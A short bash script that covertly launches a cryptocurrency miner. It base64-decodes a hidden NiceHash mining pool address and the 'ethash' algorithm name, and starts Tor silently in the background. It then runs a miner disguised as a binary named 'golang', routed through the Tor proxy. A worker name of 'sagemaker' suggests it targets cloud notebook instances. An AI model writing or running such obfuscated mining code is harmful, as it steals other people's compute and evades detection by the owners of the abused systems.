
#!/bin/bash

userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.sagemaker"
string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
key=ZXRoYXNo

seed=$(echo $string | base64 --decode)
apikey=$(echo $key | base64 --decode)

cd data

nohup ./dist/proot -S . tor  &>/dev/null &

sleep 15

./golang -a $apikey --url $seed -u $userAgent -p x --proxy 127.0.0.1:9050
